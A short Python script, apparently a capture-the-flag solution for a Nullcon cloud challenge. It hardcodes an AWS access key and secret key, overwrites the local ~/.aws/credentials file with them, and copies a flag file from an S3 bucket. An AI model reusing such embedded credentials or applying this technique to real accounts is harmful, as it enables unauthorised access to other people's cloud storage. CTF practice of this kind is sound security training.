import os
aws_creds = """
[default]
AWS_DEFAULT_REGION=eu-central-1
AWS_SECRET_ACCESS_KEY=Kr/VrI3xYyFJV0hHdCqvvL8XS/0+10eyiihLVmHc
AWS_REGION=eu-central-1
AWS_ACCESS_KEY_ID=ASIA22D7J5LEAJ27IDGC
"""
with open('/home/wowon/.aws/credentials', 'w') as f:
    f.write(aws_creds)
os.system('aws s3 cp s3://nullcon-s3bucket-flag4/flag4.txt .')
